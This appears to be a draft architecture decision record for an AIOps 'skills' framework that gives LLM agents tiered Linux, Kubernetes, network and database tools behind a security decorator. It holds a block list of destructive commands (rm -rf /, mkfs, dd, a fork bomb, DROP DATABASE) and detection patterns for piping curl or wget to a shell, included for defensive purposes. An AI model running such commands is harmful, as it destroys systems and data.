# ADR-006: Skills-as-Universal-Extensibility Framework

| Field       | Value                                          |
|-------------|------------------------------------------------|
| **Status**  | DRAFT                                          |
| **Author**  | Architect                                      |
| **Date**    | 2026-02-27                                     |
| **Reviewers** | Reviewer, Developer, Tester, Orchestrator    |
| **Supersedes** | N/A (new capability)                        |
| **Relates to** | ADR-005 (Graph Fault Propagation), P0 KubectlExecutor Security |

---

## Table of Contents

1. [Background & Motivation](#1-background--motivation)
2. [Design Principles](#2-design-principles)
3. [Skill Specification](#3-skill-specification)
4. [Security Model](#4-security-model)
5. [Skill Registry](#5-skill-registry)
6. [Tool Routing & Agent Integration](#6-tool-routing--agent-integration)
7. [Initial 8 Skills Definition](#7-initial-8-skills-definition)
8. [Skill Testing Specification](#8-skill-testing-specification)
9. [Migration Plan](#9-migration-plan)
10. [Implementation Plan](#10-implementation-plan)
11. [Appendix: Interface Stubs](#11-appendix-interface-stubs)

---

## 1. Background & Motivation

### 1.1 Origin Requirement (Ma Ronnie, 2026-02-27)

> RCA 在分析问题根因时，可以将指令发给 SRE Agent 来返回结果，也可以自己选择可以使用的工具来完成调查。
> 无论是 EC2、ECS、EKS、看 Log，查监控、连接 Datadog、拿 CloudWatch 日志，
> 使用 kubectl, ssh, aws cli, grafana, prometheus，
> 同时也包括 Linux 最基本的查询命令如 ls, grep, awk, netstat, lsof, top, vmstat, ps, tail 等
> 尽可能将 Linux 下所有的命令工具都囊括进来做为一个 Linux Admin 的 skills 来接入，
> 同时也要接入 networking engineering 遵守 Cisco CCIE 的技能能力等，
> 总 networking、compute、storage，Database Admin，
> 将这些统一来创建 skills 的方式来完成。
> 这样日后，无论是产生了什么样的新的运维类型，都可以以增加 skills 的方式，来完成增加 Scope。

### 1.2 Current State

The codebase has scattered operational tools:

| Location | Lines | Function | Limitation |
|----------|-------|----------|------------|
| `src/aci/operations/kubectl.py` | 265 | K8s commands | Only kubectl, good security model |
| `src/aci/operations/shell.py` | 98 | Shell commands | Generic, no domain awareness |
| `src/aci/topology/tools.py` | 162 | Topology queries | 5 `@tool` functions, well-structured |
| `src/aws_ops.py` | 1,793 | AWS operations | Monolithic, 0% test coverage |
| `src/aci/security/filters.py` | 168 | Security filtering | Good baseline, needs Tier model |
| `src/plugins/eks_plugin.py` | 128 | EKS plugin | Plugin pattern, not Skill pattern |

**Problems:**
- No unified tool registration — each Agent hardcodes its tools
- Security enforcement depends on callers (P0 kubectl vulnerability: `execute()` bypassed `SecurityFilter`)
- Adding a new operational domain (e.g., Networking CCIE) requires modifying core code
- No standard tool metadata format — LLM cannot reason about tool capabilities

### 1.3 Design Goal

**Skills are the _only_ extension model for operational capabilities.**

New operational domain = new Skill directory. No core code changes.

---

## 2. Design Principles

| # | Principle | Rationale |
|---|-----------|-----------|
| P1 | **Skill = atomic unit of operational capability** | One Skill per professional role (Linux Admin, DBA, etc.) |
| P2 | **Security at the decorator, not the caller** | P0 lesson: caller bypass → decorator-level enforcement (Tester) |
| P3 | **Agent picks Skills, not tools** | Keeps tool selection within ~50 limit (Reviewer) |
| P4 | **Global blacklist is inviolable** | Skill-level whitelist cannot override global blacklist (Tester) |
| P5 | **Existing code reuse** | `kubectl.py`, `SecurityFilter`, `ShellExecutor` become Skill internals (Developer) |
| P6 | **Strands `@tool` as the standard** | Consistent with `topology/tools.py` pattern (Developer) |
| P7 | **Extend by adding, not modifying** | New Skill = new directory, zero changes to `SkillRegistry` core |

---

## 3. Skill Specification

### 3.1 Directory Structure

```
src/skills/
├── __init__.py              # SkillRegistry singleton
├── _security.py             # Global security layer + @secure_tool decorator
├── _models.py               # Shared data models (ToolResult, SecurityTier, etc.)
├── _executor.py             # Shared executors (ShellExecutor, AWSExecutor)
│
├── linux_admin/
│   ├── SKILL.md             # Skill metadata + usage guide
│   ├── __init__.py          # Skill registration entry point
│   ├── tools.py             # @secure_tool decorated functions
│   ├── security.py          # Domain-specific allow/deny rules
│   ├── scripts/             # Reusable diagnostic scripts
│   │   ├── health_check.sh
│   │   └── resource_report.sh
│   ├── knowledge/           # Decision trees, runbooks
│   │   └── troubleshoot_flow.md
│   └── tests/               # Mandatory test suite
│       ├── test_tools.py
│       ├── test_security.py
│       └── test_dryrun.py
│
├── kubernetes/
│   ├── SKILL.md
│   ├── __init__.py
│   ├── tools.py
│   ├── security.py          # Migrated from kubectl.py
│   ├── runbooks/
│   │   ├── pod_crashloop.md
│   │   └── node_notready.md
│   └── tests/
│
├── network_engineer/
├── aws_general/
├── database_admin/
├── monitoring/
├── log_analysis/
└── storage/
```

### 3.2 SKILL.md Frontmatter Schema

Based on Anthropic Agent Skills specification with AIOps-specific extensions:

```yaml
---
# === Required Fields ===
name: linux_admin
version: "1.0.0"
display_name: "Linux System Administrator"
description: |
  Linux 系统管理技能。覆盖进程管理、资源诊断、文件系统操作、
  网络工具、性能分析。等同于 RHCE 级别能力。

# === Role & Domain ===
role: linux_admin          # Unique role identifier
domain: compute            # compute | networking | storage | database | observability | cloud
icon: "🐧"

# === Tool Manifest ===
tool_count: 18             # Total tools in this Skill
tier_distribution:         # Security tier breakdown
  T0_readonly: 12
  T1_low_risk: 4
  T2_high_risk: 1
  T3_destructive: 1

# === Dependencies ===
depends_on: []             # Other Skills this one requires
  # e.g., network_engineer depends_on: [linux_admin]  (for ip/ss tools)

# === Agent Affinity ===
agents:                    # Which agents typically load this Skill
  - detect: [T0]           # Detect only gets T0 (read-only) tools
  - rca: [T0, T1]          # RCA gets read + low-risk diagnostic
  - sre: [T0, T1, T2, T3]  # SRE gets everything (T2+ needs approval)

# === Execution Context ===
execution:
  requires_ssh: false       # Needs SSH access to target hosts
  requires_aws_credentials: false
  requires_kubectl: false
  timeout_default_s: 30
  max_concurrent: 5

# === Knowledge Base ===
knowledge:
  - path: knowledge/troubleshoot_flow.md
    type: decision_tree
  - path: scripts/health_check.sh
    type: runbook
---
```

### 3.3 SKILL.md Body (After Frontmatter)

The body follows Anthropic convention — human-readable Skill guide for the Agent:

```markdown
# Linux Admin Skill

## When to Use
- Process hanging, high CPU/memory → use `process_analysis`, `resource_stats`
- Disk full, I/O bottleneck → use `disk_analysis`, `io_stats`
- Network connectivity from host → use `network_diagnose`
- Log pattern search → prefer `log_analysis` Skill instead

## Safety Rules
- NEVER run commands that modify `/etc`, `/boot`, `/root` without T2 approval
- NEVER pipe curl/wget to shell (`curl | sh`)
- Always prefer diagnostic (read-only) tools first
- If you need to kill a process, verify PID ownership first

## Tool Quick Reference
| Tool | Tier | Purpose |
|------|------|---------|
| process_analysis | T0 | ps/top/vmstat aggregated view |
| resource_stats | T0 | CPU/mem/disk/load summary |
| disk_analysis | T0 | df/du/mount/lsblk |
| io_stats | T0 | iostat/iotop summary |
| network_diagnose | T0 | ping/traceroute/mtr/dig |
| file_search | T0 | find/locate/grep across filesystem |
| log_tail | T0 | tail/journalctl with filters |
| systemd_status | T0 | systemctl status/list-units |
| user_sessions | T0 | who/w/last/lastlog |
| cron_list | T0 | crontab -l / systemd timers |
| open_files | T0 | lsof/fuser for file/port |
| kernel_info | T0 | uname/dmesg/sysctl summary |
| service_restart | T1 | systemctl restart <service> |
| process_signal | T1 | kill -TERM/-HUP (not -9) |
| file_edit | T1 | Controlled config file modification |
| package_query | T1 | apt/yum list/info (read-only) |
| process_kill | T2 | kill -9 / forced termination |
| system_reboot | T3 | shutdown -r / reboot (dual approval) |
```

### 3.4 Tier-Segmented Prompt Loading

The SKILL.md body uses HTML comment markers to segment content by tier.
When an Agent loads a Skill at a specific tier, only sections at or below
that tier are included in the prompt — reducing token cost and preventing
the Agent from "knowing about" tools it cannot use.

```markdown
<!-- tier: T0 -->
## Read-Only Diagnostics
Use these tools for initial investigation...

<!-- tier: T1 -->
## Low-Risk Modifications
When diagnostics indicate a specific fix...

<!-- tier: T2 -->
## High-Risk Operations
⚠️ These tools require approval_token. Only use when...

<!-- tier: T3 -->
## Destructive Operations
🔴 Dual approval required. Only for disaster recovery...
```

**Loading rules:**
- Agent with `max_tier=T0` sees only T0 sections
- Agent with `max_tier=T1` sees T0 + T1 sections
- **Fail-closed**: unknown/missing tier marker → treated as T0 (read-only)
- Parsing uses `<!-- tier: TX -->` regex, not arbitrary string splitting

**Implementation** (via `python-frontmatter`):

```python
import frontmatter

def load_skill_prompt(skill_path: Path, max_tier: SecurityTier) -> str:
    """Load SKILL.md body, filtered to max_tier sections."""
    post = frontmatter.load(skill_path / "SKILL.md")
    body = post.content
    # Split on tier markers, include only sections <= max_tier
    return _filter_by_tier(body, max_tier)
```

---

## 4. Security Model

### 4.1 Architecture: Defense in Depth

```
┌─────────────────────────────────────────────────────────────────┐
│                    Layer 1: GLOBAL BLACKLIST                     │
│  INVIOLABLE — no Skill, no tier, no approval can override       │
│  rm -rf /, DROP DATABASE *, shutdown, fork bomb, etc.           │
│  Source: src/skills/_security.py::GLOBAL_BLACKLIST               │
├─────────────────────────────────────────────────────────────────┤
│                    Layer 2: @secure_tool DECORATOR               │
│  Framework-enforced — wraps every @tool function                │
│  Checks: blacklist → tier gate → skill policy → approval gate   │
│  Source: src/skills/_security.py::secure_tool()                  │
├─────────────────────────────────────────────────────────────────┤
│                    Layer 3: SKILL-LEVEL POLICY                   │
│  Per-skill allow/deny lists in {skill}/security.py              │
│  CANNOT weaken Layer 1 — can only add skill-specific rules      │
│  Source: src/skills/{skill}/security.py                          │
├─────────────────────────────────────────────────────────────────┤
│                    Layer 4: AGENT TIER BINDING                   │
│  Agent config declares max_tier per Skill                       │
│  detect=T0, rca=T0+T1, sre=T0+T1+T2+T3                        │
│  Source: Agent initialization / SkillRegistry.load_for_agent()   │
├─────────────────────────────────────────────────────────────────┤
│                    Layer 5: APPROVAL GATE                        │
│  T2: approval_token (HMAC-signed, from Orchestrator/human)      │
│  T3: dual approval (two distinct tokens from two sources)       │
│  Source: src/skills/_security.py::ApprovalGate                   │
└─────────────────────────────────────────────────────────────────┘
```

### 4.2 Security Tiers

| Tier | Name | Scope | Approval | Examples |
|------|------|-------|----------|----------|
| **T0** | Read-Only | Zero side effects | None | `ps aux`, `kubectl get pods`, `SELECT 1`, `df -h` |
| **T1** | Low-Risk Write | Reversible, scoped | None | `systemctl restart nginx`, `kubectl scale --replicas=3`, `kill -TERM` |
| **T2** | High-Risk | Potentially irreversible | `approval_token` (HMAC) | `kubectl delete pod`, `DROP INDEX`, `kill -9` |
| **T3** | Destructive | System-wide impact | Dual approval (2 tokens) | `kubectl drain node`, `reboot`, `DELETE FROM` without WHERE |

**Tier assignment rules:**
- If unsure → assign higher tier (conservative)
- Any command touching `kube-system`, `default`, production namespace → bump +1 tier
- Any command with `--force`, `--all`, `-A` flag → bump +1 tier

### 4.3 `@secure_tool` Decorator (Core Innovation)

This is the **P0 lesson encoded as architecture**: security enforcement lives
in the decorator, not the function body. Callers cannot bypass it.

```python
# src/skills/_security.py

from __future__ import annotations
import functools
import hashlib
import hmac
import logging
import time
from dataclasses import dataclass
from enum import IntEnum
from typing import Callable, Optional, Any

from strands import tool as strands_tool

logger = logging.getLogger(__name__)


class SecurityTier(IntEnum):
    """Security tier levels. Higher = more dangerous."""
    T0_READONLY = 0
    T1_LOW_RISK = 1
    T2_HIGH_RISK = 2
    T3_DESTRUCTIVE = 3


# ─── Global Blacklist (Layer 1) ─── INVIOLABLE ───
GLOBAL_BLACKLIST_COMMANDS = frozenset([
    "rm -rf /", "rm -rf /*", "rm -rf .", "rm --no-preserve-root",
    "mkfs", "dd if=", "shutdown -h", "halt", "init 0",
    "> /dev/sda", ":(){ :|:& };:",                          # fork bomb
    "chmod -R 777 /", "mv / ",
    "DROP DATABASE", "DROP SCHEMA", "TRUNCATE",              # DBA
    "kubectl delete namespace kube-system",
    "kubectl delete --all --all-namespaces",
    "kubectl delete nodes",
])

GLOBAL_BLACKLIST_PATTERNS = [
    r"rm\s+-[rf]+\s+/",
    r">\s*/dev/[sh]d[a-z]",
    r"dd\s+if=.*of=/dev",
    r"curl.*\|\s*sh",
    r"wget.*\|\s*sh",
    r";\s*rm\s",                     # injection: ; rm
    r"&&\s*rm\s",                    # injection: && rm
    r"\|\s*sh\b",                    # pipe to shell
]


@dataclass
class SecurityContext:
    """Passed to every tool invocation by the decorator."""
    agent_id: str
    agent_tier: SecurityTier
    skill_name: str
    tool_name: str
    approval_tokens: list[str]
    invocation_id: str
    timestamp: float


class SecurityViolation(Exception):
    """Raised when a security check fails. Caught by decorator, returned as error."""
    def __init__(self, layer: str, reason: str):
        self.layer = layer
        self.reason = reason
        super().__init__(f"[{layer}] {reason}")


def secure_tool(
    tier: int | SecurityTier,
    skill: str,
    *,
    command_param: str | None = "command",
    dry_run_support: bool = False,
) -> Callable:
    """
    Decorator factory: wraps a Strands @tool with mandatory security enforcement.

    Usage:
        @secure_tool(tier=SecurityTier.T1_LOW_RISK, skill="linux_admin")
        def shell_diagnose(command: str) -> str:
            return ShellExecutor.run(command)

    Security flow (cannot be bypassed):
        1. Global blacklist check (Layer 1)
        2. Tier gate — agent_tier >= tool_tier (Layer 4)
        3. Skill-level policy — skill-specific allow/deny (Layer 3)
        4. Approval gate — T2 needs token, T3 needs dual token (Layer 5)
        5. Audit log entry
        6. Execute function
    """
    tier = SecurityTier(tier)

    def decorator(fn: Callable) -> Callable:
        @strands_tool
        @functools.wraps(fn)
        def wrapper(*args, **kwargs) -> str:
            ctx = _build_context(skill, fn.__name__, tier)

            try:
                # Layer 1: Global blacklist — INVIOLABLE
                if command_param and command_param in kwargs:
                    _check_global_blacklist(kwargs[command_param])

                # Layer 4: Agent tier gate
                _check_tier_gate(ctx, tier)

                # Layer 3: Skill-level security policy
                _check_skill_policy(ctx, kwargs)

                # Layer 5: Approval gate (T2+)
                if tier >= SecurityTier.T2_HIGH_RISK:
                    _check_approval(ctx, tier, kwargs)

                # Dry-run intercept
                if dry_run_support and kwargs.get("dry_run", False):
                    return _dry_run_response(ctx, kwargs)

                # ✅ All checks passed — execute
                result = fn(*args, **kwargs)

                # Audit: success
                _audit_log(ctx, kwargs, success=True)
                return result

            except SecurityViolation as e:
                _audit_log(ctx, kwargs, success=False, violation=e)
                return f"🔒 BLOCKED: {e}"

        # Attach metadata for SkillRegistry introspection
        wrapper._skill_meta = {
            "skill": skill,
            "tier": tier,
            "tool_name": fn.__name__,
            "dry_run": dry_run_support,
        }
        return wrapper
    return decorator
```

### 4.4 Approval Token Protocol

```
Phase 1 (current sprint):
  approval_token = any non-empty string → passes gate
  (Matches current KubectlExecutor behavior)

Phase 2 (P1 backlog):
  approval_token = HMAC-SHA256(secret, f"{tool_name}:{timestamp}:{nonce}")
  - Secret shared between Orchestrator and SecurityGate
  - Timestamp window: ±60s
  - Single-use nonce (stored in LRU cache, evicted after use)

Phase 3 (P2):
  T3 dual approval:
  - Token 1: from Orchestrator (automated approval based on SOP match)
  - Token 2: from human operator (Slack button / API call)
  - Both must be valid; different sources (checked via `source` field in HMAC payload)
```

### 4.5 Command Injection Prevention

Every Skill that accepts command/query strings MUST apply:

```python
# Injection patterns blocked at Layer 1 (applies to ALL Skills)
INJECTION_PATTERNS = [
    r";\s*\w",           # command1 ; command2
    r"&&\s*\w",          # command1 && command2
    r"\|\|\s*\w",        # command1 || command2
    r"\$\(",             # $(subshell)
    r"`[^`]+`",          # `backtick subshell`
    r"\|\s*(?:sh|bash)", # pipe to shell
]
```

These are checked by `_check_global_blacklist()` in the `@secure_tool` decorator —
**not in each tool function**. A new Skill author cannot forget to add injection checks.

---

## 5. Skill Registry

### 5.1 Design Decision: Hybrid Load (Static Registration + Dynamic Selection)

**Trade-off analysis** (Developer's question):

| Approach | Pros | Cons |
|----------|------|------|
| Static (all at import) | Fast, simple, no runtime overhead | Loads unused Skills, wastes memory |
| Dynamic (lazy import) | Memory efficient | Import time at first call, error handling harder |
| **Hybrid** ✅ | Best of both: register metadata statically, import tools lazily | Slight code complexity |

**Decision**: Hybrid — SKILL.md frontmatter parsed at startup (fast, YAML only),
tool functions imported on first `load_for_agent()` call.

### 5.2 SkillRegistry Interface

```python
# src/skills/__init__.py

from __future__ import annotations
import importlib
import logging
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Set

import frontmatter
from pydantic import BaseModel, validator

logger = logging.getLogger(__name__)


# ─── Pydantic Models for strict validation ───

class SkillManifest(BaseModel):
    """Validated SKILL.md frontmatter."""
    name: str
    version: str
    display_name: str
    description: str
    role: str
    domain: str               # compute|networking|storage|database|observability|cloud
    icon: str = "🔧"
    tool_count: int
    tier_distribution: Dict[str, int]
    depends_on: List[str] = []
    agents: List[Dict[str, List[str]]] = []

    # Routing metadata (for can_handle)
    routing: RoutingConfig = None

    @validator("name")
    def name_must_be_snake_case(cls, v):
        if not v.replace("_", "").isalnum():
            raise ValueError(f"Skill name must be snake_case: {v}")
        return v


class RoutingConfig(BaseModel):
    """Metadata for intent-based Skill routing."""
    domains: List[str] = []         # e.g., ["linux", "os", "process", "memory"]
    keywords: List[str] = []        # e.g., ["OOMKilled", "cpu high", "disk full"]
    confidence_boost: float = 0.0   # Boost for domain-specific questions
    anti_keywords: List[str] = []   # e.g., ["kubernetes"] → NOT this Skill


@dataclass
class LoadedSkill:
    """A fully loaded Skill with tools ready for Agent use."""
    manifest: SkillManifest
    tools: List[callable]           # Filtered by agent tier
    prompt: str                     # Tier-filtered SKILL.md body
    security_policy: object         # Skill-level security rules
    knowledge_paths: List[Path] = field(default_factory=list)


class SkillRegistry:
    """
    Singleton registry for all Skills.
    
    Lifecycle:
      1. discover() — scan skills/ dir, parse SKILL.md frontmatter
      2. load_for_agent() — import tool modules, filter by tier, return LoadedSkill[]
      3. can_handle() — intent-based routing: which Skills match this query?
      4. get_tools() — return flat list of @tool functions for Agent initialization
    
    Thread safety: asyncio.Lock guards lazy imports.
    Test isolation: create_isolated() factory for testing.
    """

    _instance: Optional["SkillRegistry"] = None

    def __init__(self):
        self._manifests: Dict[str, SkillManifest] = {}
        self._loaded: Dict[str, LoadedSkill] = {}
        self._skills_dir: Path = Path(__file__).parent
        self._lock = None  # Set to asyncio.Lock() on first async call

    @classmethod
    def get(cls) -> "SkillRegistry":
        """Get or create singleton instance."""
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance

    @classmethod
    def create_isolated(cls) -> "SkillRegistry":
        """Factory for test isolation — returns a fresh, non-singleton instance."""
        return cls()

    # ─── Phase 1: Discovery (startup) ───

    def discover(self) -> Dict[str, SkillManifest]:
        """
        Scan skills/ directory for SKILL.md files.
        Parse frontmatter only (no tool import). Fast: ~5ms for 8 Skills.
        
        Returns:
            Dict of skill_name → SkillManifest
        
        Raises:
            ValueError: if SKILL.md frontmatter fails Pydantic validation
        """
        for skill_dir in self._skills_dir.iterdir():
            if not skill_dir.is_dir() or skill_dir.name.startswith("_"):
                continue
            skill_md = skill_dir / "SKILL.md"
            if not skill_md.exists():
                logger.warning("Skill dir %s missing SKILL.md — skipped", skill_dir.name)
                continue
            post = frontmatter.load(str(skill_md))
            manifest = SkillManifest(**post.metadata)
            self._manifests[manifest.name] = manifest
            logger.info("Discovered skill: %s (%d tools)", manifest.name, manifest.tool_count)

        # Validate dependency graph (no cycles, all deps exist)
        self._validate_dependencies()
        return self._manifests

    # ─── Phase 2: Load for Agent ───

    def load_for_agent(
        self,
        agent_id: str,
        skill_names: List[str],
        max_tier: "SecurityTier",
    ) -> List[LoadedSkill]:
        """
        Load specific Skills for an Agent, filtered by tier.

        Args:
            agent_id: Agent identifier (detect/rca/sre)
            skill_names: Skills to load (or ["ALL"] for SRE)
            max_tier: Maximum security tier this Agent can access

        Returns:
            List of LoadedSkill with tier-filtered tools and prompts

        Raises:
            KeyError: if skill_name not in discovered manifests
            DependencyError: if required dependency not in skill_names
        """
        if "ALL" in skill_names:
            skill_names = list(self._manifests.keys())

        # Resolve dependencies
        resolved = self._resolve_dependencies(skill_names)

        loaded = []
        for name in resolved:
            if name not in self._loaded or self._loaded[name].manifest != self._manifests[name]:
                self._import_skill(name)
            
            skill = self._loaded[name]
            # Filter tools by tier
            filtered_tools = [
                t for t in skill.tools
                if t._skill_meta["tier"] <= max_tier
            ]
            # Filter prompt by tier
            filtered_prompt = load_skill_prompt(
                self._skills_dir / name, max_tier
            )
            loaded.append(LoadedSkill(
                manifest=skill.manifest,
                tools=filtered_tools,
                prompt=filtered_prompt,
                security_policy=skill.security_policy,
                knowledge_paths=skill.knowledge_paths,
            ))
            logger.info(
                "Loaded skill %s for agent %s: %d/%d tools (max_tier=%s)",
                name, agent_id, len(filtered_tools), len(skill.tools), max_tier.name,
            )

        return loaded

    # ─── Phase 3: Intent Routing ───

    def can_handle(self, query: str, context: dict = None) -> List[tuple[str, float]]:
        """
        Route an intent/query to matching Skills.

        Returns:
            Sorted list of (skill_name, confidence) tuples, highest first.
            Confidence range: 0.0 (no match) to 1.0 (exact match).

        Routing algorithm:
            1. Keyword match against routing.keywords → base score
            2. Domain match against routing.domains → boost
            3. Anti-keyword match → score = 0 (exclude)
            4. Context boost (e.g., previous Skill used) → small boost
        """
        scores = []
        query_lower = query.lower()
        for name, manifest in self._manifests.items():
            if not manifest.routing:
                continue
            routing = manifest.routing

            # Anti-keyword exclusion
            if any(ak in query_lower for ak in routing.anti_keywords):
                continue

            score = 0.0
            # Keyword matching
            matched_keywords = sum(1 for kw in routing.keywords if kw.lower() in query_lower)
            if matched_keywords:
                score = min(0.4 + 0.15 * matched_keywords, 0.85)

            # Domain matching
            matched_domains = sum(1 for d in routing.domains if d.lower() in query_lower)
            if matched_domains:
                score += routing.confidence_boost

            # Context boost (previous skill affinity)
            if context and context.get("last_skill") == name:
                score += 0.1

            if score > 0:
                scores.append((name, min(score, 1.0)))

        return sorted(scores, key=lambda x: x[1], reverse=True)

    # ─── Phase 4: Tool Extraction ───

    def get_tools(self, loaded_skills: List[LoadedSkill]) -> List[callable]:
        """
        Flatten LoadedSkill list into a single tool list for Agent initialization.
        
        Enforces the ~50 tool limit by raising if total exceeds MAX_TOOLS_PER_AGENT.
        """
        MAX_TOOLS_PER_AGENT = 50
        tools = []
        for skill in loaded_skills:
            tools.extend(skill.tools)
        if len(tools) > MAX_TOOLS_PER_AGENT:
            logger.warning(
                "Tool count %d exceeds limit %d — consider reducing Skills",
                len(tools), MAX_TOOLS_PER_AGENT,
            )
            # Don't crash — warn and truncate by priority (higher tier tools first to drop)
            tools.sort(key=lambda t: t._skill_meta["tier"], reverse=True)
            tools = tools[:MAX_TOOLS_PER_AGENT]
        return tools

    # ─── Internal ───

    def _validate_dependencies(self):
        """Check for cycles and missing deps in the dependency graph."""
        for name, manifest in self._manifests.items():
            for dep in manifest.depends_on:
                if dep not in self._manifests:
                    raise ValueError(
                        f"Skill '{name}' depends on '{dep}' which is not discovered"
                    )
        # Cycle detection via topological sort
        visited, stack = set(), set()
        def _visit(n):
            if n in stack:
                raise ValueError(f"Dependency cycle detected involving '{n}'")
            if n in visited:
                return
            stack.add(n)
            for dep in self._manifests[n].depends_on:
                _visit(dep)
            stack.remove(n)
            visited.add(n)
        for name in self._manifests:
            _visit(name)

    def _resolve_dependencies(self, skill_names: List[str]) -> List[str]:
        """Topological sort: dependencies loaded before dependents."""
        resolved, seen = [], set()
        def _resolve(name):
            if name in seen:
                return
            seen.add(name)
            for dep in self._manifests[name].depends_on:
                if dep not in skill_names:
                    raise ValueError(
                        f"Skill '{name}' requires '{dep}' which is not in the requested set"
                    )
                _resolve(dep)
            resolved.append(name)
        for name in skill_names:
            _resolve(name)
        return resolved

    def _import_skill(self, name: str):
        """Lazy-import a Skill's tools.py module."""
        module = importlib.import_module(f"src.skills.{name}")
        # Module's __init__.py should call register_skill(...)
        if name not in self._loaded:
            raise ImportError(f"Skill '{name}' did not register itself on import")
```

### 5.3 Agent Integration API

How Agents consume Skills:

```python
# Example: RCA Agent initialization

from src.skills import SkillRegistry
from src.skills._security import SecurityTier

registry = SkillRegistry.get()
registry.discover()  # Once at startup

# RCA Agent: needs diagnostic Skills at T0+T1
rca_skills = registry.load_for_agent(
    agent_id="rca",
    skill_names=["linux_admin", "network_engineer", "database_admin",
                 "log_analysis", "monitoring", "kubernetes"],
    max_tier=SecurityTier.T1_LOW_RISK,
)

rca_tools = registry.get_tools(rca_skills)
# rca_tools is a flat list of @tool callables, ready for strands.Agent(tools=...)

rca_agent = Agent(
    model=BEDROCK_SONNET,
    tools=rca_tools,
    system_prompt=_build_system_prompt(rca_skills),  # Includes tier-filtered SKILL.md bodies
)
```

### 5.4 RCA Dual-Mode Invocation

Ma Ronnie's requirement: _"RCA 可以将指令发给 SRE Agent 来返回结果，也可以自己选择可以使用的工具来完成调查"_

```
Mode A: Direct Tool Use (default)
  RCA Agent has T0+T1 tools loaded → uses them directly
  Fast path, no inter-agent overhead
  Limited to read + low-risk diagnostics

Mode B: Delegate to SRE Agent
  RCA Agent calls @tool `delegate_to_sre(task_description, approval_context)`
  → SkillRegistry loads SRE Agent with ALL skills at T0-T3
  → SRE executes, returns result to RCA
  Used when RCA needs T2+ operations (e.g., restart a service to confirm hypothesis)
  Approval token required from Orchestrator
```

```python
@secure_tool(tier=SecurityTier.T1_LOW_RISK, skill="_system", command_param=None)
def delegate_to_sre(
    task: str,
    reason: str,
    approval_token: str = "",
) -> str:
    """
    Delegate a task to the SRE Agent for execution.
    
    Use when you need write/destructive operations beyond your tier.
    The SRE Agent has full operational access (T0-T3).
    
    Args:
        task: Description of what needs to be done
        reason: Why this delegation is needed (for audit)
        approval_token: Required for T2+ operations
    
    Returns:
        SRE Agent execution result as JSON string
    """
    from src.agents.sre_agent import SREAgent
    sre = SREAgent.create(approval_token=approval_token)
    return sre.execute_task(task, context={"delegated_by": "rca", "reason": reason})
```

---

## 6. Tool Routing & Agent Integration

### 6.1 The Tool Count Problem (Reviewer's Flag)

8 Skills × ~12 tools = **~96 tools total**. Claude's effective tool context
limit is ~50. Giving all tools to one Agent causes:

1. **Context dilution** — LLM attention spread across irrelevant tools → wrong tool selection
2. **Token waste** — tool descriptions consume ~3-5K tokens per 50 tools
3. **Latency** — more tools = slower tool-use decision

**Solution**: Agent loads 2-4 Skills per invocation (not all 8).
SkillRegistry routing selects the right subset.

### 6.2 Routing Architecture

```
                  ┌──────────────────────┐
                  │   Incoming Request    │
                  │ (alarm / chat / scan) │
                  └──────────┬───────────┘
                             │
                   ┌─────────▼──────────┐
                   │  Intent Classifier  │
                   │ (existing module)   │
                   └─────────┬──────────┘
                             │ intent + context
                   ┌─────────▼──────────┐
                   │ SkillRegistry       │
                   │ .can_handle(query)  │
                   │                     │
                   │ Scoring:            │
                   │  keyword match      │
                   │  domain match       │
                   │  anti-keyword       │
                   │  context affinity   │
                   └─────────┬──────────┘
                             │ top-K Skills (K=2..4)
                   ┌─────────▼──────────┐
                   │ load_for_agent()    │
                   │ Filter by tier      │
                   │ Import tools lazily │
                   └─────────┬──────────┘
                             │ tools[] (≤50)
                   ┌─────────▼──────────┐
                   │   Agent(tools=...)  │
                   │   Execute           │
                   └─────────┬──────────┘
                             │
                   ┌─────────▼──────────┐
                   │  Result + Audit     │
                   └─────────────────────┘
```

### 6.3 Routing Examples

| Scenario | Query/Alert | can_handle() Result | Skills Loaded |
|----------|-------------|---------------------|---------------|
| Pod CrashLoop | "Pod payment-svc CrashLoopBackOff" | kubernetes(0.85), monitoring(0.4) | kubernetes, monitoring |
| High CPU | "EC2 i-abc CPU 95% for 30min" | linux_admin(0.8), monitoring(0.6), aws_general(0.3) | linux_admin, monitoring |
| Network timeout | "Connection timeout to RDS from EKS" | network_engineer(0.8), database_admin(0.5), kubernetes(0.3) | network_engineer, database_admin |
| Disk full | "EBS vol-xyz 98% used" | storage(0.9), linux_admin(0.4) | storage, linux_admin |
| Slow query | "RDS CPU 80%, slow query log growing" | database_admin(0.85), monitoring(0.5) | database_admin, monitoring |
| Unknown | "Something is wrong with the system" | all scores < 0.3 | **Fallback set**: linux_admin, monitoring, kubernetes |

### 6.4 Fallback Strategy

When `can_handle()` returns no Skills above threshold (0.3):

1. **Default Skill Set** = `[linux_admin, monitoring, kubernetes]` (covers ~70% of incidents)
2. Log a warning: `"No skill matched query — using fallback set"`
3. After Agent run, record which tools were actually used → feed back to routing weights

### 6.5 Cross-Skill Tool Deduplication

Some tools appear in multiple Skills (e.g., `ping` in both `linux_admin` and `network_engineer`).

**Rule**: Each tool function has a unique `(skill, tool_name)` pair. If two Skills
provide functionally identical tools, the **more specialized** Skill wins:

```python
# network_engineer/tools.py → takes priority for network diagnostics
@secure_tool(tier=SecurityTier.T0_READONLY, skill="network_engineer")
def trace_route(target: str, method: str = "icmp") -> str: ...

# linux_admin/tools.py → simpler version, used when network_engineer not loaded
@secure_tool(tier=SecurityTier.T0_READONLY, skill="linux_admin")
def network_diagnose(target: str, method: str = "ping") -> str: ...
```

Dedup rule in `get_tools()`: if two tools share the same base function name,
keep the one from the Skill with higher `can_handle()` score.

---

## 7. Initial 8 Skills Definition

### 7.1 Overview

| # | Skill | Domain | Tools | Tier Dist (T0/T1/T2/T3) | Knowledge |
|---|-------|--------|-------|--------------------------|-----------|
| 1 | `linux_admin` | compute | 18 | 12/4/1/1 | RHCE troubleshoot flow |
| 2 | `kubernetes` | compute | 15 | 8/4/2/1 | K8s runbooks (CrashLoop, OOM, NotReady) |
| 3 | `network_engineer` | networking | 14 | 9/3/2/0 | CCIE troubleshoot decision tree |
| 4 | `aws_general` | cloud | 16 | 10/4/2/0 | AWS Well-Architected patterns |
| 5 | `database_admin` | database | 12 | 7/3/1/1 | Query optimization, connection pool tuning |
| 6 | `monitoring` | observability | 10 | 8/2/0/0 | Alert correlation patterns |
| 7 | `log_analysis` | observability | 8 | 7/1/0/0 | Log pattern library |
